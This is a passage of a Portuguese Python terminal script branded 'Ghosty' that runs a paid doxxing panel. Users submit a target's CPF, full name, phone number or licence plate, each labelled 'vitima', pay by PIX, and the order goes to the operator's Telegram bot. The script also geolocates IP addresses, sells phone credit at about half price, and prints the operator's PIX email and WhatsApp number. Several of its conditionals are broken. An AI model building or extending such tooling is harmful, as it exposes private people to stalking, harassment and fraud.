    tipo_consul = '~Ghosty👻: CONSULTA PLACA'
    print(cor('~Ghosty👻: DIGITE A PLACA COMPLETA SEM ESPACOS', 'blue'))
    vitima = input('~Ghosty👻: PLACA: ')
    system('clear')
    print(cor('~Ghosty👻: DIGITE SEU WHATS OU EMAIL, A CONSUL SERA ENVIADA LA', 'blue'))
    contato = input('~Ghosty👻: SEU WHATS ou EMAIL: ')
    system('clear')
    print(cor('~Ghosty👻: DIGITE O NOME DA CONTA QUE IRA PAGAR, PARA IDENTIFICARMOS SEU PAGAMENTO', 'blue'))
    nome = input('~Ghosty👻: PAGADOR: ')
    valor = '0.50'
    system('clear')
    print(cor(f'''~Ghosty👻: RESUMO DO PEDIDO:
TIPO CONSUL: {tipo_consul}
PLACA: {vitima}
CONTATO: {contato}
PAGADOR: {nome}
VALOR: R${valor}''', 'yellow'))
    print('''~Ghosty👻: OS DADOS ESTAO CORRETOS?
[1]Sim
[2]Nao''')
    opc = input('~Ghosty👻: DIGITE A OPCAO: ')
    if opc == '1':
        gerar = gerarpix(valor=valor, tipoconsul=tipo_consul, nome=nome, contato=contato, vitima=vitima)
        if gerar == True:
            print('~Ghosty👻: Oq deseja fazer agora ?')
            px = input(cor('''[1]Consultar Novamente
[2]Voltar''', 'yellow'))
            if px == '1':
                puxar_nome()
            if px >= '2':
                painel_consultas()
            else:
                system('clear')
                print(cor('~Ghosty👻: OPCAO INVALIDA!!!', 'red'))
                time.sleep(3)
                puxar_nome()
        else:
            exit()
    
                    
    if opc == '2':
        system('clear')
        print(cor('~Ghosty👻: PREENCHA NOVAMENTE...', 'red'))
        time.sleep(4)
        buscar_placa()
        
    else:
        system('clear')
        print(cor('~Ghosty👻: SOMENTE OPCAO 1 E 2 DISPONIVEL!!!', 'red'))
        time.sleep(4)
        buscar_placa()
    
def qualvalor(valor_recarga):
    if valor_recarga == '10':
        return 'R$6,00'
    if valor_recarga == '15':
        return 'R$8,00'
    if valor_recarga == '20':
        return 'R$11,00'
    if valor_recarga == '25':
        return 'R$14,00'
    if valor_recarga == '30':
        return 'R$17,00'
    if valor_recarga == '40':
        return 'R$23,00'
    if valor_recarga == '50':
        return 'R$28,00'
    if valor_recarga == '60':
        return 'R$34,00'
    if valor_recarga == '70':
        return 'R$38,00'
    if valor_recarga == '80':
        return 'R$42,00'
    if valor_recarga == '90':
        return 'R$46,00'
    if valor_recarga == '100':
        return 'R$50,00'
    if valor_recarga == '150':
        return 'R$78,00'
    if valor_recarga == '200':
        return 'R$96,00'

def menu_recarga():
    global token
    global id_message
    system('clear')
    print(cor('~Ghosty👻: BEM VINDO AO PAINEL DE RECARGA GOLD', 'blue'))
    print(cor('''~Ghosty👻: 𝓜𝓔𝓝𝓤 𝓡𝓔𝓒𝓐𝓡𝓖𝓐 𝓓𝓔 𝓒𝓡𝓔𝓓𝓘𝓣𝓞𝓢
    

TESTE RECARGA DE 10 --> PAGA R$6,00
Recarga de 15  -->  paga 8,00 Reais   
Recarga de 20  -->  paga 11,00 Reais  
Recarga de 25  -->  paga 14,00 Reais   
Recarga de 30  -->  paga 17,00 Reais  
Recarga de 40  -->  paga 23,00 Reais  
Recarga de 50  -->  paga 28,00 Reais  
Recarga de 60  -->  paga 34,00 Reais  
Recarga de 70  -->  paga 38,00 Reais  
Recarga de 80  -->  paga 42,00 Reais  
Recarga de 90  -->  paga 46,00 Reais  
Recarga de 100  -->  paga 50,00 Reais
    
Somente Pré Pago (Nao pode ter Plano Controle ou Vivo Easy na linha)''', 'yellow'))  
    
    print('~Ghosty👻: PARA COMPRAR DIGITE 1 E PARA VOLTAR DIGITE 2')
    opcao = input('~Ghosty👻: ESCOLHA: ')
    if opcao == '1':
        system('clear')
        valor_recarga = input('~Ghosty👻: DIGITE QUANTOS CREDITOS QUER COLOCAR: ')
        system('clear')
        permitidos = ['10', '15', '20', '25', '30', '40', '50', '60', '70', '80', '90', '100', '150', '200']
        lista = list(permitidos)
        if valor_recarga in lista:
            print(cor('''~Ghosty👻:''','green'))
            print(cor(''' O NOME DEVE SER O MESMO DA CONTA QUE IRA PAGAR
PARA QUE POSSAMOS IDENTIFICAR O PAGAMENTO E EVITAR REEMBOLSO''', 'red'))
            pegarnome = input('~Ghosty👻: DIGITE SEU NOME : ')
            system('clear')
            pegarnumero = input('~Ghosty👻: DIGITE SEU NUMERO COM DDD: ')
            valor = qualvalor(valor_recarga)
            system('clear')
            print(cor('''~Ghosty👻: VERIFIQUE SE OS DADOS ESTAO CORRETOS
SE ESTIVER DIGITE 1, CASO CONTRARIO 2''', 'blue'))
            print(f'''~Ghosty👻:
NOME: {pegarnome}
NUMERO: {pegarnumero}
CREDITOS: {valor_recarga}''')
            escolha = input('~Ghosty👻: DIGITE 1 PARA PROSSEGUIR: ')
            if escolha == '1':
                print(f'''~Ghosty👻: TUDO CERTO {pegarnome}, SO PAGAR E SEU PEDIDO ENTRARA NA FILA :)

FORMA DE PAGAMENTIO: PIX
TIPO CHAVE: EMAIL''')
                print(cor(f'''~Ghosty👻:
        CHAVE: ghostvoltz29@gmail.com
        VALOR: {valor}''', 'green'))
                print('''~Ghosty👻:
QUANDO PAGAR DIGITE [ 1 ] PARA FINALIZAR O PEDIDO''')
                vaipagar = input('~Ghosty👻: DIGITE A OPCAO: ')
                if vaipagar == '1':
                    system('clear')
                    message = f'''~Ghosty👻: Salveeeeeeeeeeeee
Acabaram de efetuar uma compra de Creditos
NOME = {pegarnome}
NUMERO = {pegarnumero}
PEDIDO = {valor_recarga}
TOTAL PAGO = {valor}

É NOIS CHEFE, ÓTIMO DIAAAAAA'''
                    url_base = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id_message}&text={message}'
                    requests.get(url_base)
                    print(cor('~Ghosty👻: PEDIDO ADICIONADO A FILA, SE TUDO OCORRER BEM VOCE RECEBERA UMA MENSAGEM EM BREVE', 'green'))
                    time.sleep(4)
                    menu_recarga()

                if vaipagar == '2':
                    menu_recarga()
                    
                else:
                    system('clear')
                    print(cor('~Ghosty👻: DIGITE SOMENTE AS OPCOES DISPONIVEIS!!!!!', 'red'))
                    time.sleep(5)
                    menu_recarga()

            if escolha == '2':
                print(cor('~Ghosty👻: PREENCHA NOVAMENTE!!! VOLTANDO EM 5 SEGUNDOS...', 'red'))
                menu_recarga()    

            else:
                system('clear')
                print(cor('~Ghosty👻: DIGITE SOMENTE AS OPCOES DISPONIVEIS!!!!!', 'red'))
                time.sleep(5)
                menu_recarga()

        else:
            system('clear')
            valores_disponiveis = ['10', '15', '20', '25', '30', '40', '50', '60', '70', '80', '90', '100', '150', '200']
            print(cor('~Ghosty👻: DIGITE APENAS OS VALORES DISPONIVEIS: ', 'red'))
            print(cor("~Ghosty👻:", 'green'))
            print(cor(valores_disponiveis, 'red'))
            time.sleep(5)
            menu_recarga()
            
    if opcao == '2':
        menu_vendas()

    else:
        system('clear')
        print(cor('~Ghosty👻:', 'green'))
        print(cor('ERRO!!! DIGITE SOMENTE 1 OU 2', 'red'))
        time.sleep(5)
        menu_recarga()

def puxar_cep():
    system('clear')
    print(cor('~Ghosty👻: DIGITE O CEP QUE IRA CONSULTAR SEM TRACO', 'blue'))
    cep = input(cor('~Ghosty👻: CEP: '))
    url_base = requests.get(f'https://viacep.com.br/ws/{cep}/json/')
    result = url_base.json()
    if result == SystemError:
        print(cor('~Ghosty👻:', 'green'))
        print(cor('CEP INVALIDO !!!!!', 'red'))
        time.sleep(4)
        puxar_cep()

    if 'erro' not in result:
        system('clear')
        print(f'''~Ghosty👻: CEP: {cep}''')
        g = input(cor('''~Ghosty👻: DESEJA CONSULTAR?
[1]Sim
[2]Nao
: ''', 'yellow'))
        if g == '1' or 'sim' or 'Sim':
            system('clear')
            print('~Ghosty👻: CEP ENCONTRADO :)')
            print(cor(f'''~Ghosty👻:
CEP: {result['cep']}
RUA: {result['logradouro']}
COMPLEMENTO: {result['complemento']}
BAIRRO: {result['bairro']}
CIDADE: {result['localidade']}
ESTADO: {result['uf']}
IBGE: {result['ibge']}
GIA: {result['gia']}
DDD: {result['ddd']}
SIAFI: {result['siafi']}
    ''', 'green'))
            print(cor('''~Ghosty👻:
[1]Consultar Novamente
[2]Voltar
            ''', 'yellow'))
            op = input('''~Ghosty👻: DIGITE UMA OPCAO: ''')
            if op == '1':
                puxar_cep()
            if op == '2':
                painel_consultas()
            else:
                print(cor('~Ghosty👻: SOMENTE OPCAO 1 OU 2 DISPONIVEL', 'red'))
                time.sleep(3)
                painel_consultas()
        if g == '1' or 'nao' or 'Nao':
            painel_consultas()
        else:
            system('clear')
            print(cor('~Ghosty👻: OPCAO INVALIDA!!!', 'red'))
            time.sleep(4)
            puxar_cep()
    else:
        print(cor('~Ghosty👻:', 'green'))
        print(cor('Cep Invalido!!!', 'red'))
        time.sleep(4)
        puxar_cep()
        
def puxar_cnpj():
    system('clear')
    print(cor('~Ghosty👻: DIGITE O CNPJ SEM TRACOS OU BARRAS!!!', 'blue'))
    cnpj = input('~Ghosty👻: CNPJ: ')
    result = requests.get(f'https://api-publica.speedio.com.br/buscarcnpj?cnpj={cnpj}').json()
    system('clear')
    if 'error' not in result:
        system('clear')
        print(f'~Ghosty👻: CNPJ: {cnpj}')
        j = input(cor('''~Ghosty👻: DESEJA CONSULTAR?
[1]Sim
[2]Nao''', 'yellow'))
        if j == '1' or 'sim' or 'Sim':
            system('clear')
            print('~Ghosty👻: INICIANDO CONSULTA.....'), 'green'
            time.sleep(2)
            system('clear')
            print('~Ghosty👻: CNPJ ENCONTRADO :)')
            time.sleep(2)
            resultado = f'''~Ghosty👻:
Nome Fantasia: {result['NOME FANTASIA']}
Razao Social: {result['RAZAO SOCIAL']}
Cnpj: {result['CNPJ']}
Status: {result['STATUS']}
Setor: {result['SETOR']}
Descricao: {result['CNAE PRINCIPAL DESCRICAO']}
Codigo: {result['CNAE PRINCIPAL CODIGO']}
Cep: {result['CEP']}
Data Abertura: {result['DATA ABERTURA']}
DDD: {result['DDD']}
Telefone: {result['TELEFONE']}
Email: {result['EMAIL']}
Tipo Logradouro: {result['TIPO LOGRADOURO']}
Logradouro: {result['LOGRADOURO']}
Numero: {result['NUMERO']}
Complemento: {result['COMPLEMENTO']}
Bairro: {result['BAIRRO']}
Cidade: {result['MUNICIPIO']}
Estado: {result['UF']}
    '''
            system('clear')
            print(cor(resultado, 'green'))
            print(cor('''~Ghosty👻: DESEJA CONSULTAR NOVAMENTE?
[1]SIM
[2]VOLTAR''', 'yellow'))
            verresposta = input('~Ghosty👻: DIGITE A OPCAO: ')
            if verresposta == '1':
                result.clear()
                time.sleep(4)
                puxar_cnpj()

            if verresposta == '2':
                system('clear')
                time.sleep(3)
                painel_consultas()

            else:
                print(cor('~Ghosty👻: OPCAO INVALIDA!!!', 'red'))
                time.sleep(3)
                painel_consultas()
                
    else:
        system('clear')
        print(cor('~Ghosty👻: Cnpj Invalido!!!!', 'red'))
        time.sleep(4)
        puxar_cnpj()
    
def enviar_consultaCPF(tipo_consulta, pagador, cpf, numero):
    system('clear')
    global token
    global id_message
    mensagem = f'''~Ghosty👻: Salveeeeeeeeeeeee
    Acabaram de efetuar uma consulta de {tipo_consulta}
PAGADOR = {pagador}
:) CPF PARA CONSULTAR = {cpf}
NUMERO DE CONTATO = {numero}

É NOIS CHEFE, ÓTIMO DIAAAAAA'''
    url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id_message}&text={mensagem}'
    requests.get(url)
    print(cor('~Ghosty👻: SEU PEDIDO FOI ADICIONADO A FILA, SE TUDO OCORRER BEM VOCE SERA AVISADO NO WHATSAPP', 'green'))
    time.sleep(2)
    print('''~Ghosty👻:
            DESEJA CONSULTAR NOVAMENTE ?
[1]Sim
[2]Nao
''')
    escolha = input('~Ghosty👻: DIGITE A OPCAO: ')
    if escolha == '1':
        time.sleep(1)
        puxar_cpf()
    if escolha == '2':
        time.sleep(2)
        painel_consultas()
    else:
        system('clear')
        print(cor('~Ghosty👻: OPCAO INVALIDA!!!!!!', 'red'))
        time.sleep(4)
        exit()

def enviar_consulttelefone(tipo_consulta, pagador, numero, numeroconsultado):
    system('clear')
    global token
    global id_message
    mensagem = f'''~Ghosty👻: Salveeeeeeeeeeeee
    Acabaram de efetuar uma consulta de {tipo_consulta}
PAGADOR = {pagador}
NUMERO DE CONTATO = {numero}
:) NUMERO PRA CONSULTAR = {numeroconsultado}

É NOIS CHEFE, ÓTIMO DIAAAAAA'''
    url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id_message}&text={mensagem}'
    requests.get(url)
    print(cor('~Ghosty👻: SEU PEDIDO FOI ADICIONADO A FILA, SE TUDO OCORRER BEM VOCE SERA AVISADO NO WHATSAPP', 'green'))
    time.sleep(4)
    print('''~Ghosty👻:
            DESEJA CONSULTAR NOVAMENTE ?
[1]Sim
[2]Nao
''')
    escolha = input('~Ghosty👻: DIGITE A OPCAO: ')
    if escolha == '1':
        time.sleep(1)
        buscar_telefone()
    if escolha == '2':
        time.sleep(2)
        painel_consultas()
    else:
        system('clear')
        print(cor('~Ghosty👻: OPCAO INVALIDA!!!!', 'red'))
        time.sleep(4)
        exit()

def enviar_consultaNOME(tipo_consulta, pagador, numero, nome):
    system('clear')
    global token
    global id_message
    mensagem = f'''~Ghosty👻: Salveeeeeeeeeeeee
    Acabaram de efetuar uma consulta de {tipo_consulta}
PAGADOR = {pagador}
NOME PRA CONSULTAR = {nome}
NUMERO DE CONTATO = {numero}

É NOIS CHEFE, ÓTIMO DIAAAAAA'''
    url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id_message}&text={mensagem}'
    requests.get(url)
    print(cor('~Ghosty👻: SEU PEDIDO FOI ADICIONADO A FILA, SE TUDO OCORRER BEM VOCE SERA AVISADO NO WHATSAPP', 'green'))
    time.sleep(4)
    print('''~Ghosty👻:
            DESEJA CONSULTAR NOVAMENTE ?
[1]Sim
[2]Nao
''')
    escolha = input('~Ghosty👻: DIGITE A OPCAO: ')
    if escolha == '1':
        time.sleep(1)
        puxar_nome()
    if escolha == '2':
        time.sleep(2)
        painel_consultas()
    else:
        system('clear')
        print(cor('~Ghosty👻: OPCAO INVALIDA!!!!!!', 'red'))
        time.sleep(4)
        exit()
    
def puxar_ip():
    system('clear')
    print(cor('~Ghosty👻: DIGITE O IP DIGITE COM PONTOS E SEM ESPACO!!!', 'blue'))
    ip = input('~Ghosty👻: IP: ') 
    consult = requests.get(f'http://ip-api.com/json/{ip}')
    result = consult.json()
    time.sleep(4)
    if 'invalid query' not in result:
        system('clear')
        print(cor('~Ghosty👻: INICIANDO BUSCA...', 'yellow'))
        time.sleep(3)
        system('clear')
        print(cor(f'''~Ghosty👻: IP ENCONTRADO...
      BY Ghost
IP: {result["query"]}
PAIS: {result['country']}
CODIGO DO PAIS: {result['countryCode']}
REGIAO: {result['regionName']}
ESTADO: {result['region']}
CEP: {result['zip']}
CIDADE: {result["city"]}
LATITUDE: {result["lat"]}
LONGITUDE: {result["lon"]}
ZONA: {result["timezone"]}
PROVEDOR: {result["isp"]}
ORG: {result["org"]}
AS: {result['as']}
''', 'green'))        
        print('''~Ghosty👻:
[1]Nova Consulta
[2]Voltar''')
        cons = input('~Ghosty👻: DIGITE A OPCAO: ')
        if cons == '1':
            painel_consultas()
        if cons == '2':
            menu_vendas()
        else:
            print(cor('~Ghosty👻: OPCAO INVALIDA!!!!'))
            time.sleep(2)
            painel_consultas()
    else:
        system('clear')
        print(cor('~Ghosty👻: IP INVALIDO!!!', 'red'))
        time.sleep(4)
        painel_consultas()
         
def puxar_cpf():
    system('clear')
    tipo_consul = '~Ghosty👻: CONSULTA CPF'
    valor = '1.00'
    print(cor('~Ghosty👻: DIGITE O CPF QUE DESEJA CONSULTAR', 'blue'))
    vitima = input('~Ghosty👻: CPF VITIMA: ')
    print(cor('~Ghosty👻: DIGITE SEU WHATSAPP A CONSULTA SERA ENVIADA LA', 'blue'))
    contato = input('~Ghosty👻: SEU WPP: ')
    print(cor('~Ghosty👻: DIGITE O NOME DE QUEM IRA PAGAR PARA IDENTIFICARMOS O PAGAMENTO', 'blue'))
    nome = input('~Ghosty👻: SEU NOME: ')
    time.sleep(3)
    system('clear')
    print('~Ghosty👻: RESUMO DO PEDIDO')
    print(cor(f'''PAGADOR: {nome} 
CONTATO: {contato}
VITIMA: {vitima}
TIPO DA CONSULTA: {tipo_consul}
VALOR: R${valor}
    ''', 'yellow'))
    yes = input('''~Ghosty👻: SEU PEDIDO ESTA CORRETO?
[1]Sim
[2]Nao
: ''')
    if yes == '1':
        gerar = gerarpix(valor=valor, tipoconsul=tipo_consul, nome=nome, contato=contato, vitima=vitima)
        if gerar == True:
            system('clear')
            print(cor('''~Ghosty👻: OQ DESEJA FAZER AGORA?
[1]Consultar Novamente
[2]Voltar''', 'yellow'))
            con = input('~Ghosty👻: DIGITE UMA OPCAO: ')
            if con == '1':
                puxar_cpf()
            if con == '2':
                painel_consultas()
            else:
                system('clear')
                print(cor('~Ghosty👻: OPCAO INVALIDA!!!',  'red'))
                time.sleep(3)
                puxar_cpf()

        else:
            exit()

    if yes == '2':
        puxar_cpf()
    
    else:
        system('clear')
        print(cor('~Ghosty👻: OPCAO INVALIDA!!!', 'red'))
        time.sleep(3)
        puxar_cpf()
    
def puxar_nome():
    system('clear')
    valor = '0.50'
    tipo_consul = '~Ghosty👻: CONSULTA NOME'
    time.sleep(1)
    print(cor('~Ghosty👻: DIGITE O NOME A SER CONSULTADO (TEM QUE SER COMPLETO)', 'blue'))
    vitima = input('~Ghosty👻: NOME VITIMA: ')
    system('clear')
    print(cor('~Ghosty👻: DIGITE SEU WHATSAPP COM DDD, A CONSULTA SERA ENVIADA LA!', 'blue'))
    contato = input('~Ghosty👻: SEU WPP: ')
    system('clear')
    print(cor('~Ghosty👻: NOME DE QUEM IRA PAGAR PARA IDENTIFICARMOS SEU PAGAMENTO','blue'))
    nome = input('~Ghosty👻: SEU NOME: ')
    system('clear')
    print(f'''~Ghosty👻:
NOME A CONSULTAR {vitima}
WHATSAPP PARA RECEBER A CONSULTA: {contato}
QUEM PAGOU? {nome}''')
    a = input(cor(f'''~Ghosty👻: OS DADOS ESTAO CORRETOS ?
[1]Sim
[2]Nao
:''', 'yellow'))
    if a == '1':
        gerar = gerarpix(valor=valor, tipoconsul=tipo_consul, nome=nome, contato=contato, vitima=vitima)
        if gerar == True:
            print('~Ghosty👻: Oq deseja fazer agora ?')
            px = input(cor('''[1]Consultar Novamente
[2]Voltar''', 'yellow'))
            if px == '1':
                puxar_nome()
            if px >= '2':
                painel_consultas()
            else:
                system('clear')
                print(cor('~Ghosty👻: OPCAO INVALIDA!!!', 'red'))
                time.sleep(3)
                puxar_nome()
        else:
            exit()
                
    if a == '2':
        puxar_nome()
    else:
        system('clear')
        print(cor('~Ghosty👻: OPCAO INVALIDA!!!', 'red'))
        time.sleep(3)
        puxar_nome()

def buscar_telefone():
    system('clear')
    time.sleep(2)
    valor = '0.50'
    tipo_consul = '~Ghosty👻: CONSULTA NUMERO'
    print(cor('~Ghosty👻: DIGITE O NUMERO A SER CONSULTADO (com DDD)', 'blue'))
    vitima = input('~Ghosty👻: NUMERO VITIMA: ')
    system('clear')
    print(cor('~Ghosty👻: DIGITE SEU WHATSAPP A CONSULTA SERA ENVIADA LA', 'blue'))
    contato = input('~Ghosty👻: SEU WPP: ')
    system('clear')
    print(cor('~Ghosty👻: NOME DE QUEM IRA PAGAR PRA IDENTIFICARMOS SEU PAGAMENTO', 'blue'))
    nome = input('~Ghosty👻: SEU NOME: ')
    system('clear')
    print(cor(f'''~Ghosty👻: RESUMO DA CONSULTA:
TELEFONE A CONSULTAR: {vitima}
WHATSAPP RECEBEDOR: {contato}
QUEM PAGOU? {nome}
''', 'yellow'))
    a = input(cor('''~Ghosty👻: OS DADOS ESTAO CORRETOS ?
[1]Sim
[2]Voltar
: '''))
    if a == '1':
        gerar = gerarpix(valor=valor, tipoconsul=tipo_consul, nome=nome, contato=contato, vitima=vitima)
        if gerar == True:
            print('~Ghosty👻: Oq deseja fazer agora ?')
            px = input(cor('''[1]Consultar Novamente
[2]Voltar''', 'yellow'))
            if px == '1':
                buscar_telefone()
            if px >= '2':
                painel_consultas()
            else:
                system('clear')
                print(cor('~Ghosty👻: OPCAO INVALIDA!!!', 'red'))
                time.sleep(3)
                buscar_telefone()
        else:
            exit()
                
    if a == '2':
        buscar_telefone()

    else:
        system('clear')
        print(cor('~Ghosty👻: OPCAO INVALIDA!!!', 'red'))
        time.sleep(3)
        buscar_telefone()

def atualizar():
    system('clear')
    print(('''~Ghosty👻: FIQUE SEMPRE DE OLHO NO NOSSO CANAL NO GITHUB!
SEMPRE ATUALIZAMOS DIRETO POR LA :)
SITE: https://github.com/GhostVoltz/GhostyPainel
    caso queira garantir a atualização, apague a pasta e de o comando
    git clone https://github.com/GhostVoltz/GhostyPainel''', 'blue'))
    back = input(cor('~Ghosty👻: DIGITE 1 PRA VOLTAR: ', 'yellow'))
    if back == '1':
        menu()
    else:
        system('clear')
        print(cor('~Ghosty👻: OPCAO INVALIDA!!!', 'red'))
        time.sleep(3)
        atualizar()
        
def dar_sugestao():
    global token
    global id_message
    system('clear')
    print("~Ghosty👻:")
    print('''[0]Voltar
[1]Avaliar
[2]Relatar Bug
[3]Dar Sugestao''')
    i = input('DIGITE A OPCAO: ')
    if i == '0':
        menu_vendas()
    if i == '1':

        system('clear')
        print('~Ghosty👻: diga sua opniao sobre o script :)')
        avl = input('~Ghosty👻: Avalie aqui: ')
        txt = f'''~Ghosty👻: Ola chefe, vc tem uma avaliacao nova :))))))
AVALIACAO: {avl}'''
        system('clear')
        url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id_message}&text={txt}'
        requests.get(url)
        print('~Ghosty👻: Ola usuario sua avaliacao foi repassada pro meu dono, obrigado pelo feedback sua opniao e de suma importancia para nos :)')
        time.sleep(5)
        dar_sugestao()
        
    if i == '2':
        system('clear')
        print('~Ghosty👻: NOS INFORME O BUG')
        bug = input('Bug: ')
        system('clear')
        msg = f'''~Ghosty👻: Ola chefe, nos relataram um bug :(
RELATO: {bug}
        '''
        url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id_message}&text={msg}'
        requests.get(url)
        print('~Ghosty👻: Ola usuario seu relato foi repassado pro meu dono, obrigado pelo aviso isso e de suma importancia para nos, e  nos desculpamos por qualquer ocorrido :)')
        time.sleep(5)
        dar_sugestao()     
        
    if i == '3':
        system('clear')
        print('~Ghosty👻: De sua sugestao para o script :)')
        sug = input('Sugestao: ')
        msg2 = f'''~Ghosty👻: Ola chefe, vc tem uma nova sugestao :)
SUGESTAO: {sug}'''
        system('clear')
        url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id_message}&text={msg2}'
        requests.get(url)
        print('~Ghosty👻: Ola usuario, obrigado pela sugestao... Se for aprovada, logo vc vai esta usufruindo dela aqui ;)')
        time.sleep(5)
        dar_sugestao()
    else:
        system('clear')
        print(cor('~Ghosty👻: OPCAO INVALIDA !!!', 'red'))
        time.sleep(4)
        dar_sugestao()
        
def redes_sociaisPAINEL():
    system('clear')
    system('clear')
    print('''~Ghosty👻: REDES SOCIAIS DO GHOST :)
digite a opcao para ser redirecionado para a rede social''')
    print(cor('''
[1] WhatsApp
[2] Telegram
[20]Voltar''', 'blue'))
    v = input('~Ghosty👻: DIGITE A OPCAO: ')
    if v == '1':
        system('clear')
        print('~Ghosty👻: ABRINDO WHATSAPP...')
        system('termux-open-url https://wa.me/5551991609688')
        time.sleep(3)
        redes_sociaisPAINEL()
    if v == '2':
        system('clear')
        print('~Ghosty👻: Abrindo Telegram...')
        system('termux-open-url https://t.me/ghost/')
        time.sleep(3)
        redes_sociaisPAINEL()
    if v == '20':
        painel_consultas()
    else:
        print(cor(f'~Ghosty👻: OPCAO {v} INVALIDA!!!!!', 'red'))
        time.sleep(5)
        redes_sociaisPAINEL()

def redes_sociaisCONS():
    system('clear')
    system('clear')
    print('''~Ghosty👻: REDES SOCIAIS Ghost :)
digite a opcao para ser redirecionado para a rede social''')
    print(cor('''
[1] WhatsApp
[2] Telegram
[20]Voltar''', 'blue'))
    v = input('~Ghosty👻: DIGITE A OPCAO: ')
    if v == '1':
        system('clear')
        print('~Ghosty👻: ABRINDO WHATSAPP...')
        system('termux-open-url https://wa.me/5551991609688')
        time.sleep(3)
        redes_sociaisCONS()
    if v == '2':
        system('clear')
        print('~Ghosty👻: Abrindo Telegram...')
        system('termux-open-url https://t.me/ghost/')
        time.sleep(3)
        redes_sociaisCONS()
        
    if v == '20':
        painel_consultas()
    else:
        print(cor(f'~Ghosty👻: OPCAO {v} INVALIDA!!!!!', 'red'))
        time.sleep(5)
        redes_sociaisCONS()
              
def redes_sociais():
    system('clear')
    system('clear')
    print('''~Ghosty👻: REDES SOCIAIS Ghost :)
digite a opcao para ser redirecionado para a rede social''')
    print(cor('''
[1] WhatsApp
[2] Telegram
[20]Voltar''', 'blue'))
    v = input('~Ghosty👻: DIGITE A OPCAO: ')
    if v == '1':
        system('clear')
        print('~Ghosty👻: ABRINDO WHATSAPP...')
        system('termux-open-url https://wa.me/5551991609688')
        time.sleep(3)
        redes_sociais()
    if v == '2':
        system('clear')
        print('~Ghosty👻: Abrindo Telegram...')
        system('termux-open-url https://t.me/ghost/')
        time.sleep(3)
        redes_sociais()
    if v == '3':
        system('clear')
        print('~Ghosty👻: Abrindo Instagram...')
        system('termux-open-url https://www.instagram.com/')
        time.sleep(3)
        redes_sociais()
    if v == '20':
        menu()
    else:
        print(cor(f'~Ghosty👻: OPCAO {v} INVALIDA!!!!!', 'red'))
        time.sleep(5)
        redes_sociais()

menu()
